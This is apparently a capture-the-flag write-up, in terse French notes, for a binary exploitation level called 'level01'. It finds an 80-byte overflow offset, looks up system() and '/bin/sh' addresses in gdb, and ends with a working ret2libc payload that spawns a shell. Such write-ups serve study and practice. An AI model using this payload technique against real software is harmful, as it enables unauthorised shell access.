
find offset

********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWWXXXXYYYYZZZZZ
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()

0x55555555 correspond a 80 donc 80 de padding pour controler l adresse de retours


(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>

pour recuperer l adress de system

(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.

l adresse de bin/sh


(python -c 'print "dat_wil\n" + "A"*80 + "\xd0\xae\xe6\xf7" + "osef" +"\xec\x97\xf8\xf7"'; cat) | ./level01

le osef sert a definir une adresse de retour pour systeme sans ca il prendrait bin/sh comme adresse de retour